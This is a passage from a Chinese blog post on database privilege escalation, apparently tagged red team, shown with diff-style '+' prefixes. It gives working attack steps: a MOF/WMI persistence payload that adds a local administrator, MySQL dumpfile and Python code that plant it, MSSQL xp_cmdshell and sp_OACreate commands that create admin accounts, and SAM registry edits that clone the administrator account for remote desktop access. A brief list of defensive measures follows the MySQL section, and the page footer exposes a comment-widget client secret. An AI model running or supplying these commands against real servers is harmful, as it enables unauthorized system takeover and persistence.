+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace = &quot;Root\\Cimv2&quot;; </span><br><span class="line">    Name  = &quot;filtP2&quot;; </span><br><span class="line">    Query = &quot;Select * From __InstanceModificationEvent &quot; </span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; </span><br><span class="line">            &quot;And TargetInstance.Second = 5&quot;; </span><br><span class="line">    QueryLanguage = &quot;WQL&quot;; </span><br><span class="line">&#125;; </span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name = &quot;consPCSV2&quot;; </span><br><span class="line">    ScriptingEngine = &quot;JScript&quot;; </span><br><span class="line">    ScriptText = </span><br><span class="line">    &quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user Yuy0ung admin123 /add\&quot;)&quot;; </span><br><span class="line">&#125;; </span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   = $Consumer; </span><br><span class="line">    Filter = $EventFilter; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>Copy</p>
+<p>在添加用户之后，还需要将用户加入本地管理员组，将脚本中的<code>net.exe user Yuy0ung admin123 /add\</code>换成：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup Administrators Yuy0ung /add</span><br></pre></td></tr></table></figure>
+
+<p>Copy</p>
+<p>脚本文件的上传思路与udf提权类似，大概三种：</p>
+<ul>
+<li><p>直接上传然后dumpfile</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;C:/test.mof&quot;) into dumpfile &quot;c:/windows/system32/wbem/mof/nullevt.mof&quot;</span><br></pre></td></tr></table></figure>
+
+<p>Copy</p>
+</li>
+<li><p>直接将脚本的16进制编码dumpfile</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 0x23707261676d61206e616d65737061636528225c5c5c5c2e5c5c726f6f745c5c737562736372697074696f6e2229200a696e7374616e6365206f66205f5f4576656e7446696c74657220617320244576656e7446696c746572200a7b200a202020204576656e744e616d657370616365203d2022526f6f745c5c43696d7632223b200a202020204e616d6520203d202266696c745032223b200a202020205175657279203d202253656c656374202a2046726f6d205f5f496e7374616e63654d6f64696669636174696f6e4576656e742022200a20202020202020202020202022576865726520546172676574496e7374616e636520497361205c2257696e33325f4c6f63616c54696d655c222022200a20202020202020202020202022416e6420546172676574496e7374616e63652e5365636f6e64203d2035223b200a2020202051756572794c616e6775616765203d202257514c223b200a7d3b200a0a696e7374616e6365206f66204163746976655363726970744576656e74436f6e73756d65722061732024436f6e73756d6572200a7b200a202020204e616d65203d2022636f6e735043535632223b200a20202020536372697074696e67456e67696e65203d20224a536372697074223b200a2020202053637269707454657874203d200a202020202276617220575348203d206e657720416374697665584f626a656374285c22575363726970742e5368656c6c5c22295c6e5753482e72756e285c226e65742e65786520757365722061646d696e2061646d696e202f6164645c2229223b200a7d3b200a0a696e7374616e6365206f66205f5f46696c746572546f436f6e73756d657242696e64696e67200a7b200a20202020436f6e73756d65722020203d2024436f6e73756d65723b200a2020202046696c746572203d20244576656e7446696c7465723b200a7d3b into dumpfile &#x27;C:/windows/system32/wbem/mof/nullevt.mof&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>Copy</p>
+</li>
+<li><p>数据库允许远程链接的情况下可以使用py写入</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> MySQLdb</span><br><span class="line"></span><br><span class="line">conn=MySQLdb.connect(host=<span class="string">&quot;192.168.111.6&quot;</span>,user=<span class="string">&quot;root&quot;</span>,passwd=<span class="string">&quot;root&quot;</span>) </span><br><span class="line"></span><br><span class="line">payload = <span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span></span><br><span class="line"><span class="string">instance of __EventFilter as $EventFilter</span></span><br><span class="line"><span class="string"> &#123;</span></span><br><span class="line"><span class="string"> EventNamespace = &quot;Root\\Cimv2&quot;;</span></span><br><span class="line"><span class="string"> Name = &quot;filtP2&quot;;</span></span><br><span class="line"><span class="string"> Query = &quot;Select * From __InstanceModificationEvent &quot;</span></span><br><span class="line"><span class="string"> &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span></span><br><span class="line"><span class="string"> &quot;And TargetInstance.Second = 5&quot;;</span></span><br><span class="line"><span class="string"> QueryLanguage = &quot;WQL&quot;;</span></span><br><span class="line"><span class="string"> &#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">instance of ActiveScriptEventConsumer as $Consumer</span></span><br><span class="line"><span class="string"> &#123;</span></span><br><span class="line"><span class="string"> Name = &quot;consPCSV2&quot;;</span></span><br><span class="line"><span class="string"> ScriptingEngine = &quot;JScript&quot;;</span></span><br><span class="line"><span class="string"> ScriptText =</span></span><br><span class="line"><span class="string"> &quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user xxxx xxx /add\&quot;)&quot;;</span></span><br><span class="line"><span class="string"> &#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">instance of __FilterToConsumerBinding</span></span><br><span class="line"><span class="string"> &#123;</span></span><br><span class="line"><span class="string"> Consumer = $Consumer;</span></span><br><span class="line"><span class="string"> Filter = $EventFilter;</span></span><br><span class="line"><span class="string"> &#125;;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">ascii_payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> each_chr <span class="keyword">in</span> payload:</span><br><span class="line">    ascii_payload += <span class="built_in">str</span>(<span class="built_in">ord</span>(each_chr)) + <span class="string">&#x27;,&#x27;</span></span><br><span class="line"></span><br><span class="line">ascii_payload = ascii_payload[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">cur = conn.cursor()</span><br><span class="line">sql = <span class="string">&quot;select char(%s) into dumpfile &#x27;C:/windows/system32/wbem/mof/nullevt.mof&#x27;&quot;</span> % ascii_payload</span><br><span class="line"></span><br><span class="line">cur.execute(sql)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>
+
+<p>Copy</p>
+</li>
+</ul>
+<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>服务器会每五秒会循环执行之前的mof文件中的内容，在服务器被mof提权后，需要解决系统继续运行恶意代码的问题：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">net stop winmgmt</span><br><span class="line"><span class="comment">#停止winmgmt服务</span></span><br><span class="line"><span class="built_in">rmdir</span> /q /s c:\windows\system32\wbem\repository</span><br><span class="line"><span class="comment">#删除存储库备份</span></span><br><span class="line"><span class="built_in">del</span> /f /s c:\windows\system32\wbem\mof\good\nullevt.mof</span><br><span class="line"><span class="comment">#删除mof文件</span></span><br><span class="line">net <span class="built_in">start</span> winmgmt</span><br><span class="line"><span class="comment">#重启winmgmt服务</span></span><br></pre></td></tr></table></figure>
+
+<p>Copy</p>
+<h2 id="三、针对MySQL提权的防御手段"><a href="#三、针对MySQL提权的防御手段" class="headerlink" title="三、针对MySQL提权的防御手段"></a>三、针对MySQL提权的防御手段</h2><p>从上面提到的提权过程可以知道，这些权限提升基本都是mysql的配置不当导致的，因此，可以有如下防御措施：</p>
+<ul>
+<li>降低数据库服务启动用户的权限</li>
+<li>如果非必要，可以删除插件目录或限制插件目录的权限</li>
+<li>正确配置secure_file_priv变量</li>
+</ul>
+<h1 id="SQL-server提权"><a href="#SQL-server提权" class="headerlink" title="SQL server提权"></a>SQL server提权</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“存储过程”：其实质就是一个“集合”，那么是什么样的结合呢，就是存储在SqlServer中预先定义好的“SQL语句集合”，说的更直白一些就是使用T-SQL语言编写好的各种小脚本共同组成的集合体，我们称之为“存储过程”。而存储过程中的这些小脚本中，其危险性最高的“小脚本”就是扩展存储过程中的“xp_cmdshell脚本”，它可以执行操作系统的任何指令。如果我们能够获取SA的管理员权限，我们就可以使用SA的管理权限可以直接执行扩展存储过程中的“xp_cmdshell脚本”，并获得返回值。</span><br></pre></td></tr></table></figure>
+
+<h2 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell:"></a><strong>xp_cmdshell:</strong></h2><p> xp_cmdshell可以执行系统命令，该组件默认是关闭的，因此需要把它打开。xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重新开启它</p>
+<p><strong>MSSQL的权限：</strong></p>
+<p> 在Windows server类的操作系统上，默认具有system权限。System权限在Windows server2003中权限仅比admin小；而在2003以上的版本，则为系统权限</p>
+<p><strong>初期流程：</strong></p>
+<p>1、获取SA密码</p>
+<p>获取webshell之后可尝试在服务器各个站点的目录寻找sa的密码（某些站点直接在web应用程序中使用sa连接数据库），一般情况下，.net的站点数据库连接字符串在web.config或者和global.aspx也有可能是编译在DLL文件当中</p>
+<p>2、判断端口</p>
+<p>通过端口扫描查看1433（mssql默认端口）是否对外开放。如果对外开放则使用sql连接器进行提权，如果没有对外开放，<strong>则使用webshell自带的mssql数据库连接功能连接至mssql数据库</strong>。</p>
+<p><strong>xp_cmd提权过程</strong></p>
+<p>目的：创建一个新的administrator用户</p>
+<p><strong>1、开始xp_cmd扩展功能</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    use master;</span><br><span class="line">    exec sp_configure &#x27;show advanced options&#x27;,1;</span><br><span class="line">    reconfigure;</span><br><span class="line">    exec sp_configure &#x27;xp_cmdshell&#x27;,1;</span><br><span class="line">    reconfigure;</span><br><span class="line">    </span><br><span class="line">##1开启，0关闭，关闭时从xp_cmdshell  ---&gt; options依次关闭</span><br></pre></td></tr></table></figure>
+
+<p><strong>2、任意命令执行</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use master;</span><br><span class="line">exec master..xp_cmdshell &quot;whoami&quot;;</span><br><span class="line">use master;</span><br><span class="line">exec master..xp_cmdshell &quot;ipconfig&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><strong>3、添加用户</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use master;</span><br><span class="line">exec master..xp_cmdshell &quot;net user 123 123/add&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><strong>4、添加用户到管理员组</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use master;</span><br><span class="line">exec master..xp_cmdshell &quot;net localgroup administrators 123 /add&quot;;</span><br></pre></td></tr></table></figure>
+
+<h2 id="OLE提权过程"><a href="#OLE提权过程" class="headerlink" title="OLE提权过程"></a>OLE提权过程</h2><p>首先还是xp_cmd，当xp_cmd被删除或出错的情况下，利用SP_OACreate</p>
+<p>OLE 这系列的存储过程有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sp_OACreate，sp_OADestroy，sp_OAGetErrorInfo，sp_OAGetProperty，sp_OAMethod，sp_OASetProperty，sp_OAStop</span><br></pre></td></tr></table></figure>
+
+<p><strong>1、打开SP_OACreate选项</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use master;</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;  </span><br><span class="line">RECONFIGURE WITH OVERRIDE;  </span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;  </span><br><span class="line">RECONFIGURE WITH OVERRIDE;  </span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 0;</span><br></pre></td></tr></table></figure>
+
+<p><strong>2、添加用户456</strong></p>
+<p>注意是没有回显的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c net user 456 456 /add&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>3、添加用户456至管理员权限组</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c net localgroup administrators 456/add&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="xp-regread-xp-regwrite克隆账号"><a href="#xp-regread-xp-regwrite克隆账号" class="headerlink" title="xp_regread &amp; xp_regwrite克隆账号"></a>xp_regread &amp; xp_regwrite克隆账号</h2><p>利用xp_regread 与 xp_regwrite两个存储过程脚本可以直接读取与写入注册表，所以我们可以利用这个两个存过过程来实现对“远程主机”的administrator超级管理员账号进行克隆，从而实现对目标主机的控制。</p>
+<p>1、获取administrator的加密密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_regread &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SAM\SAM\Domains\Account\Users\000001F4&#x27;,&#x27;F&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>下图是navicat中的显示，并没有完全显示加密密码</p>
+<p>下图是在靶机sql server中执行语句的结果</p>
+<p><strong>2、将加密密码赋值给guest账号</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SAM\SAM\Domains\Account\Users\000001F5&#x27;,&#x27;F&#x27;,&#x27;reg_binary&#x27;,0x0300010000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFF7F0000000000000000F40100000102000011020000000000000000000001000000000000004A010C00;</span><br></pre></td></tr></table></figure>
+
+<p><strong>3、使用guest账号登录远程桌面管理</strong></p>
+<p>注意：此条件的使用需要guest 用户在“远程桌面用户组”，否则出现不允许远程登录的情况；</p>
+<p>针对此问题，我们尝试将guest用户添加到“administrators”组或者“Remote Desktop Users”。</p>
+<ol>
+<li>guest账户需要被启用； </li>
+<li>guest 账户需要在“Remote Desktop Users”</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#x27;net user guest /active:yes&#x27;;</span><br><span class="line"></span><br><span class="line">exec master..xp_cmdshell &#x27;net localgroup &quot;Remote Desktop Users&quot; a /add&#x27;;</span><br></pre></td></tr></table></figure>
+
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">wuk0Ng</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://web-wuk0ng.github.io/2026/10/31/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/">https://web-wuk0ng.github.io/2026/10/31/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noopener noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank" rel="noopener noreferrer">wuk0Ng</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E5%86%85%E7%BD%91/">
+                                    <span class="chip bg-color">内网</span>
+                                </a>
+                            
+                                <a href="/tags/%E7%BA%A2%E9%98%9F/">
+                                    <span class="chip bg-color">红队</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 42px 0 22px;
+        text-align: center;
+    }
+
+    #reward .reward-open {
+        width: 52px;
+        height: 52px;
+        padding: 0;
+        color: #fff;
+        font-size: 1.35rem;
+        line-height: 52px;
+        cursor: pointer;
+        border: 0;
+        border-radius: 50%;
+        background: #ef5350;
+        box-shadow: 0 5px 16px rgba(239, 83, 80, 0.3);
+        transition: transform 160ms ease, box-shadow 160ms ease;
+    }
+
+    #reward .reward-open:hover,
+    #reward .reward-open:focus-visible {
+        background: #ef5350;
+        box-shadow: 0 8px 22px rgba(239, 83, 80, 0.38);
+        transform: translateY(-2px);
+    }
+
+    .reward-dialog[hidden] {
+        display: none !important;
+    }
+
+    .reward-dialog {
+        position: fixed;
+        z-index: 10020;
+        inset: 0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 18px;
+        opacity: 0;
+        visibility: hidden;
+        transition: opacity 180ms ease, visibility 180ms ease;
+    }
+
+    .reward-dialog.is-open {
+        opacity: 1;
+        visibility: visible;
+    }
+
+    .reward-dialog-backdrop {
+        position: absolute;
+        inset: 0;
+        cursor: pointer;
+        background: rgba(15, 20, 18, 0.62);
+        backdrop-filter: blur(3px);
+        -webkit-backdrop-filter: blur(3px);
+    }
+
+    .reward-dialog-panel {
+        position: relative;
+        z-index: 1;
+        width: min(620px, 94vw);
+        max-height: calc(100vh - 36px);
+        padding: 26px 28px 24px;
+        overflow: auto;
+        border-radius: 16px;
+        background: #fff;
+        box-shadow: 0 24px 80px rgba(0, 0, 0, 0.3);
+        outline: 0;
+        transform: translateY(12px) scale(0.98);
+        transition: transform 180ms ease;
+    }
+
+    .reward-dialog.is-open .reward-dialog-panel {
+        transform: translateY(0) scale(1);
+    }
+
+    .reward-dialog-close {
+        position: absolute;
+        top: 10px;
+        right: 12px;
+        width: 38px;
+        height: 38px;
+        padding: 0;
+        color: #555;
+        font-size: 28px;
+        line-height: 34px;
+        cursor: pointer;
+        border: 0;
+        border-radius: 50%;
+        background: transparent;
+    }
+
+    .reward-dialog-close:hover,
+    .reward-dialog-close:focus-visible {
+        color: #fff;
+        background: #ef5350;
+    }
+
+    .reward-dialog-title {
+        padding: 0 34px;
+        margin: 0 0 8px;
+        color: #333;
+        font-size: 1.5rem;
+        line-height: 1.4;
+        text-align: center;
+    }
+
+    .reward-dialog-tip {
+        margin: 0 0 20px;
+        color: #777;
+        font-size: 0.92rem;
+        text-align: center;
+    }
+
+    .reward-methods {
+        display: grid;
+        grid-template-columns: repeat(2, minmax(0, 1fr));
+        gap: 18px;
+    }
+
+    .reward-method {
+        padding: 14px;
+        margin: 0;
+        border: 1px solid #ececec;
+        border-radius: 12px;
+        background: #fafafa;
+    }
+
+    .reward-qr-frame {
+        display: flex;
+        aspect-ratio: 1 / 1;
+        align-items: center;
+        justify-content: center;
+        overflow: hidden;
+        border-radius: 8px;
+        background: #fff;
+    }
+
+    .reward-qr {
+        display: block;
+        width: 100%;
+        height: 100%;
+        object-fit: contain;
+    }
+
+    .reward-qr[hidden] {
+        display: none !important;
+    }
+
+    .reward-qr-missing {
+        padding: 20px;
+        color: #999;
+        line-height: 1.7;
+        text-align: center;
+    }
+
+    .reward-method figcaption {
+        margin-top: 10px;
+        color: #444;
+        font-size: 1rem;
+        font-weight: 600;
+        text-align: center;
+    }
+
+    body.reward-dialog-open {
+        overflow: hidden;
+    }
+
+    @media only screen and (max-width: 600px) {
+        .reward-dialog-panel {
+            padding: 24px 18px 20px;
+        }
+
+        .reward-methods {
+            grid-template-columns: 1fr;
+        }
+
+        .reward-method {
+            width: min(100%, 270px);
+            margin: 0 auto;
+        }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+        .reward-dialog,
+        .reward-dialog-panel,
+        #reward .reward-open {
+            transition: none;
+        }
+    }
+</style>
+
+<div id="reward">
+    <button id="rewardOpen" class="reward-open" type="button" aria-haspopup="dialog" aria-controls="rewardDialog" title="打开打赏二维码">赏</button>
+</div>
+
+<div id="rewardDialog" class="reward-dialog" hidden>
+    <div class="reward-dialog-backdrop" data-reward-close aria-hidden="true"></div>
+    <section class="reward-dialog-panel" role="dialog" aria-modal="true" aria-labelledby="rewardDialogTitle" tabindex="-1">
+        <button class="reward-dialog-close" type="button" data-reward-close aria-label="关闭打赏窗口" title="关闭">×</button>
+        <h4 id="rewardDialogTitle" class="reward-dialog-title">你的赏识是我前进的动力</h4>
+        <p class="reward-dialog-tip">请选择支付宝或微信扫码支持</p>
+        <div class="reward-methods">
+            <figure class="reward-method">
+                <div class="reward-qr-frame">
+                    <img src="/medias/reward/aliyunpay.png" class="reward-qr" alt="支付宝打赏二维码" loading="lazy" decoding="async">
+                    <div class="reward-qr-missing" hidden>支付宝二维码暂未配置</div>
+                </div>
+                <figcaption>支付宝</figcaption>
+            </figure>
+            <figure class="reward-method">
+                <div class="reward-qr-frame">
+                    <img src="/medias/reward/wechat1.png" class="reward-qr" alt="微信打赏二维码" loading="lazy" decoding="async">
+                    <div class="reward-qr-missing" hidden>微信二维码暂未配置</div>
+                </div>
+                <figcaption>微信</figcaption>
+            </figure>
+        </div>
+    </section>
+</div>
+
+<script>
+    (function () {
+        var openButton = document.getElementById('rewardOpen');
+        var dialog = document.getElementById('rewardDialog');
+        if (!openButton || !dialog) return;
+
+        var panel = dialog.querySelector('.reward-dialog-panel');
+        var closeButtons = dialog.querySelectorAll('[data-reward-close]');
+        var lastFocused = null;
+        var closeTimer = 0;
+
+        document.body.appendChild(dialog);
+
+        dialog.querySelectorAll('.reward-qr').forEach(function (image) {
+            function showMissing() {
+                image.hidden = true;
+                var message = image.nextElementSibling;
+                if (message) message.hidden = false;
+            }
+
+            image.addEventListener('error', showMissing);
+            if (image.complete && image.naturalWidth === 0) showMissing();
+        });
+
+        function openDialog() {
+            window.clearTimeout(closeTimer);
+            lastFocused = document.activeElement;
+            dialog.hidden = false;
+            document.body.classList.add('reward-dialog-open');
+            window.requestAnimationFrame(function () {
+                dialog.classList.add('is-open');
+                panel.focus();
+            });
+        }
+
+        function closeDialog() {
+            dialog.classList.remove('is-open');
+            document.body.classList.remove('reward-dialog-open');
+            closeTimer = window.setTimeout(function () {
+                dialog.hidden = true;
+                if (lastFocused && typeof lastFocused.focus === 'function') lastFocused.focus();
+            }, 180);
+        }
+
+        openButton.addEventListener('click', openDialog);
+        closeButtons.forEach(function (button) {
+            button.addEventListener('click', closeDialog);
+        });
+        document.addEventListener('keydown', function (event) {
+            if (event.key === 'Escape' && !dialog.hidden) closeDialog();
+        });
+    }());
+</script>
+
+            
+        </div>
+    </div>
+
+    
+        <!-- Gitalk is bundled with the theme to avoid a blocking overseas CDN request. -->
+<link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+
+<!-- 引入主题自定义 CSS（如有需要，若 my-gitalk.css 是本地文件则保留原路径） -->
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+  <div class="comment_headling">
+    <i class="fas fa-comments fa-fw"></i>
+    <span>评论</span>
+  </div>
+  <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script>
+  (function () {
+    var container = document.getElementById('gitalk-container');
+    var loaded = false;
+    if (!container) return;
+
+    function renderGitalk() {
+      var gitalk = new Gitalk({
+        clientID: 'Ov23liTNlK9NLcZwFSo8',
+        clientSecret: '7472cd54d6ca5e38d14f6d1b5176299bb4cf4ebe',
+        repo: 'blog---comments',
+        owner: 'web-wuk0Ng',
+        admin: ["web-wuk0Ng"],
+        id: '2026-10-31T21-00-00',
+        distractionFreeMode: false
+      });
+      gitalk.render('gitalk-container');
+    }
+
+    function loadGitalk() {
+      if (loaded) return;
+      loaded = true;
+      var script = document.createElement('script');
+      script.src = '/libs/gitalk/gitalk.min.js';
+      script.async = true;
+      script.onload = renderGitalk;
+      document.head.appendChild(script);
+    }
+
+    if ('IntersectionObserver' in window) {
+      var observer = new IntersectionObserver(function (entries) {
+        if (entries.some(function (entry) { return entry.isIntersecting; })) {
+          observer.disconnect();
+          loadGitalk();
+        }
+      }, { rootMargin: '500px 0px' });
+      observer.observe(container);
+    } else {
+      window.addEventListener('load', loadGitalk, { once: true });
+    }
+  }());
+</script>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles home-title-grid compact-prenext-grid">
+    <div class="row article-row">
+        <div class="article home-title-card col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a class="home-title-link" href="/2026/10/31/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/" aria-label="阅读：数据库提权">
+                    <h2>数据库提权</h2>
+                </a>
+                
+                <div class="compact-card-tags" aria-label="文章标签">
+                    
+                    <a href="/tags/%E5%86%85%E7%BD%91/" class="compact-card-tag">#内网</a>
+                    
+                    <a href="/tags/%E7%BA%A2%E9%98%9F/" class="compact-card-tag">#红队</a>
+                    
+                </div>
+                
+            </div>
+        </div>
+
+        <div class="article home-title-card col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
